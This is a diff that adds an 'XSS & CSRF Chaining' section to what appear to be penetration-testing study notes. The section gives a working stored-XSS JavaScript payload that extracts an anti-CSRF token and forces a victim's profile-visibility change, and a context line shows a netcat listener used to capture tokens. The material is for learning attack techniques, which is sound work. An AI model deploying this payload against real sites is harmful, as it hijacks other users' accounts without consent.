@@ -214,3 +214,24 @@ nc -nlvp 8000
 - listener should record the csrf token which can be used for post requests
 
 
+### XSS & CSRF Chaining
+
+- In this example we change the profiles visibility
+- Use the below script to recreate changing the profiles visibility
+```javascript
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse; // triggers the handle response function on page load
+req.open('get','/app/change-visibility',true); // get request for the change visibility page
+req.send();
+function handleResponse(d) {
+    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1]; // locates the csrf token
+    var changeReq = new XMLHttpRequest(); 
+    changeReq.open('post', '/app/change-visibility', true); // creates post request
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); // sets the header
+    changeReq.send('csrf='+token+'&action=change'); // uses the previously aquired anti-csrf token and changes profile visibility
+};
+</script>
+```
+- Enter the script into a field vulnerable to XSS and update the profile
+- Now when a different user visits that persons public profile the script will be executed and their profile visibility will change
